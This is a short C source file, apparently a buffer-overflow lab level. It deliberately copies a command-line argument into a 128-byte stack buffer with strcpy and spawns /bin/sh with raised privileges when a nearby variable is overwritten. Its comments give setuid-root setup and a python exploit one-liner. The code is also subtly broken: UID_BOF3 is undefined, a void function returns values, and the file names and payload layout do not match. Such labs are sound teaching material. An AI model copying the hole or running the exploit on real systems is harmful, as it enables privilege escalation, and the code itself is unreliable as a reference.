// AFTER => bof.c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#define BUF_SIZE 128
#define KEY 0x61616161
#define R "\033[31m"
#define E "\033[0m"

// ASLR OFF
// COMPILE $ gcc -fno-stack-protector bof2.c -o bof2
// SETUID  $ sudo chown root:root bof2
//         $ sudo chmod 4755 bof2
// EXPLOIT $ ./bof2 `python -c "print 'aaaa'+'x'*140"`

void vuln(char * arg) {
    int innocent;
    char buf[BUF_SIZE];

    strcpy(buf, arg);
    printf("Hello %s!\n", buf);

    if (innocent == KEY) {
        if (setreuid(UID_BOF3, UID_BOF3)) {
            perror("setuid");
            return 1;
        }
        if (setregid(UID_BOF3, UID_BOF3)) {
            perror("setgid");
            return 1;
        }
        system("/bin/sh");
    }
}

int main(int argc, char *argv[]){
    if (argc < 2) {
        fputs(R "error :( this program needs some arguments\n" E, stderr);
        return 1;
    }
    vuln(argv[1]);
    return 0;
}
